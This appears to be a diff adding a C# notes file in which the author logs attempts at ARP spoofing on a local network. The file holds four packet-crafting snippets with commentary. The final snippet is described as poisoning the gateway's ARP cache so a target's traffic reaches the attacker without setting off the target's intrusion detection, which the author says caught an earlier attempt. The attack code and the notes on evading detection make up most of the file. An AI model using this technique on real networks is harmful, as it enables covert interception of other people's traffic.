@@ -1,0 +1,49 @@
+/*
+Finally!
+I tried a lot of different spoof combinations. 
+For example: 
+*/
+ARPPacket arppacketfortarget = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), target.Key, capturedevice.MacAddress, gatewayipaddress);
+EthernetPacket ethernetpacketfortarget = new EthernetPacket(capturedevice.MacAddress, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), EthernetPacketType.Arp);
+ethernetpacketfortarget.PayloadPacket = arppacketfortarget;
+capturedevice.SendPacket(ethernetpacketfortarget);
+/*
+The above code is equivalent to sending a broadcast(due to the target MAC address being "FF-FF-FF-FF-FF-FF" in crafting the EthernetPacket) ARP request(due to the ARP operation being of type ARPOperation.Request and the target MAC being "00-00-00-00-00-00" in crafting the ARPPacket) asking for the MAC id of target(3rd argument in crafting the ARPPacket) client pretending to be the gateway device(last argument in crafting the ARPPacket)
+Since a broadcast packet is only acted on by the client device with the matching target IP, all other clients ignore the packet while the target device gets it and records that our MAC address(capturedevice.MacAddress) has the gatewayipaddress
+This theoretically has to be enough to route all of the target's traffic through the attacking device, this also leaves room for the target device to suspect that an arp spoof may be happening because if such a program capable of analyzing ARP packets is installed, it can easily read that there are multiple MAC addresses sending the same request claiming to be have the same ip i.e. the gatewayipaddress since the gateway will not shut up about it as we have done nothing to respond to its genuine ARP requests.
+Exactly this happened in my case, ESET Smart Security 10 had no trouble detecting the "Malicious ARP Packets"
+*/
+/*
+I also tried the following:
+*/
+ARPPacket arppacketforgateway = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), gatewayipaddress, capturedevice.MacAddress, myipaddress);
+EthernetPacket ethernetpacketforgateway = new EthernetPacket(capturedevice.MacAddress, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), EthernetPacketType.Arp);
+ethernetpacketforgateway.PayloadPacket = arppacketforgateway;
+capturedevice.SendPacket(ethernetpacketforgateway);
+/*
+The above code sends a broadcast arp request asking for the MAC id of gateway pretending to be myself(last argument of ARP crafting call is myipaddress)
+I don't know why I did that lol. All that achieves is a genuine IP address - MAC correspondence in the gateway device's ARP cache!
+*/
+/*
+And the the following:
+*/
+ARPPacket arppacketforgateway = new ARPPacket(ARPOperation.Response, gatewaymacaddress, gatewayipaddress, capturedevice.MacAddress, target.Key);
+EthernetPacket ethernetpacketforgateway = new EthernetPacket(capturedevice.MacAddress, gatewaymacaddress, EthernetPacketType.Arp);
+ethernetpacketforgateway.PayloadPacket = arppacketforgateway;
+capturedevice.SendPacket(ethernetpacketforgateway);
+/*
+The above code sends a targetted(second argument in crafting the EthernetPacket == to the gateway device) ARP response pretending to be the target device.
+Nothing happened in this case. Since it was targetted to the gateway device, no detection by the target's IDS of course. But the gateway device seemed to just drop the gratuitous response without updating its ARP cache.
+*/
+/*
+And finally in the following morning(right now, its 6:06AM @ May 6, 2017), I tried the following code which finally worked without triggering any IDS:
+*/
+ARPPacket arppacketforgatewayrequest = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), gatewayipaddress, capturedevice.MacAddress, target.Key);
+EthernetPacket ethernetpacketforgatewayrequest = new EthernetPacket(capturedevice.MacAddress, gatewaymacaddress, EthernetPacketType.Arp);
+ethernetpacketforgatewayrequest.PayloadPacket = arppacketforgatewayrequest;
+capturedevice.SendPacket(ethernetpacketforgatewayrequest);
+/*
+The above code sends a targetted ARP request to the gateway device asking for the MAC id of gateway pretending to be the target device.
+Doing that achieves an entry in the ARP cache of the gateway device that maps the target IP to our MAC thus routing all packets originally destined for the target device to our attacking machine. The target device doesn't get a clue since 1. we're using a targetted SendPacket to send only to the gateway 2. we're pretending to be the target device, not the gateway.
+But the code must be repeated frequently enough to swamp the genuine ARP packets broadcast by the target.
+*/
